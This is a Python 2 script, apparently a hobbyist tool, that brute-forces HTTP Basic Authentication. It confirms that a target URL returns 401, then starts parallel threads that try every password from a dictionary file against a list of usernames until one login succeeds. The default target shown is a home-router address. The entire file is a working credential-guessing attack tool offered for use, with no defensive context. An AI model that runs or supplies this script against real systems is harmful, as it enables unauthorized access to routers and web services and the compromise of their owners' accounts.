#coding:utf8
#
#HTTP BASIC Auth PASSWD SCANNER
#AUTHOR:SpriteCN
#BLOG:http://www.fantansy.cn
#

import requests
from time import sleep,time
from threading import Thread
from config import *

#set Number of concurrent threads
#threadsNo = 4
#url= 'http://192.168.1.1'
#username = 'admin'
#set retry geturl times
#trytimes= 3

def scan(url, username, passwd, rusltListIndex):
    t = 0
    while t<trytimes:
        try:
            r = requests.get(url,auth=(username,passwd))
            t = trytimes
        except requests.exceptions.ConnectionError:
            print "try error %s can't connect" % url
            t += 1
        except:
            print 'try error'
            t += 1
    if r.ok:
        print  'try username:%s,passwd:%s success  OK!!!  ^_^ !!!! :) !!'%(
            username,passwd)
        rusltList[rusltListIndex] = 1
        return 1
    else:
        print 'try username:%s,passwd:%s fail' %(username,passwd)
        return 0

if __name__ == "__main__":
    #check url
    try:
        r = requests.get(url)
    except requests.exceptions.ConnectionError:
        print "try error %s can't connect" % url
        exit(0)
    except:
        print "try error"
        exit(0)
    if r.status_code != 401:
        print "the server no http basic auth"
        exit(0)
        
    threadList = []
    rusltList = [0] *threadsNo
    fh = file('passwd_dict.txt','r')
    count = 1
    startTime=time()
    while 1:
        passwdFromFile = fh.readline()[:-1]
        print 'line:%s password:%s' %(count,passwdFromFile)
        if not passwdFromFile:
                print 'done'
                exit(0)
        for username in usernameList:
            if 1 in rusltList:
                print 'success'
                print 'use time:%s' %(time()-startTime)
                fh.close()
                exit(0)
            if len(threadList)<threadsNo:
                if len(threadList) == 0:
                    listIndex = 0
                else:
                    listIndex = len(threadList)
                #print 'threadList[index]:%s' %listIndex
                threadList.append(Thread(target=scan,args=(url,username,passwdFromFile,listIndex,)))
                threadList[listIndex].start()
            else:
                a = 1
                while a:
                    for i in xrange(0,threadsNo):
                        if threadList[i].isAlive():
                            continue
                        else:
                            threadList[i]=Thread(target=scan,args=(url,username,passwdFromFile,i,))
                            threadList[i].start()
                            a=0
                            break
            sleep(sleep_time)
        count += 1




